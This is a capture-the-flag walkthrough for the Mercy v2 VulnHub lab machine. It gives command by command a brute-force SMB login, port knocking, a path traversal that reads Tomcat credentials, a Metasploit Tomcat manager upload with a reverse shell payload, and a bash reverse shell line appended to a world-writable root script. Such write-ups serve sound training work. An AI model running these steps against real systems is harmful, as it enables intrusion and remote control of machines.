
# Digital.World.Mercy v2 Walkthrough

**VulnHub Link:** [Mercy v2](https://www.vulnhub.com/entry/digitalworldlocal-mercy-v2,263/)
**Difficulty:** Easy to Medium
**Release Date:** 28 Dec 2018


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.127 


## 2.Enumeration

enum4linux 192.168.100.127

smbmap -H '192.168.100.127' -u '' -p ''

hydra 192.168.100.127 -L VirtualBox\ VMs/Mercy\ v2/ctf/usernames.txt -p 'password' smb -s 139

smbclient //192.168.100.127/qiu -U "qiu"

"""
[openHTTP]
	sequence    = 159,27391,4
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[closeHTTP]
	sequence    = 4,27391,159
	seq_timeout = 100
	command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
	tcpflags    = syn

[openSSH]
	sequence    = 17301,28504,9999
	seq_timeout = 100
	command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn

[closeSSH]
	sequence    = 9999,28504,17301
	seq_timeout = 100
	command     = /sbin/iptables -D iNPUT -s %IP% -p tcp --dport 22 -j ACCEPT
	tcpflags    = syn
"""


knock 192.168.100.127 159 27391 4 -v
knock 192.168.100.127 17301 28504 9999 -v


http://192.168.100.127/ ---> RIPS service running 

http://ip/nomercy/windows/code.php?file=../../../../../../../etc/tomcat7/tomcat-users.xml

To Access tomcat7 server ---> msfconsole tool can be used.


## 3.Explotation

>>>msfconsole -q
>>>use tomcat_mgr_upload
>>>setting --> rhosts,rport(8080),httppassword(heartbreakisinevitable),httpusername(thisisasuperduperlonguser),lhost(wlan0 or eth0)
>>>set target 2
>>>set payload payload/linux/x86/shell_reverse_tcp

Gaining a shell --> escalating to user fluffy:freakishfluffybunny


## 4.Privilege Escalation

--- /home/fluffy/.private/secrets/timeclock

This file canbe written by anynone and has root perms.

echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" >> timeclock

It is recommended that always listen before configuring reverse shell

and BINGO!! Root shell opened and Root flag captured
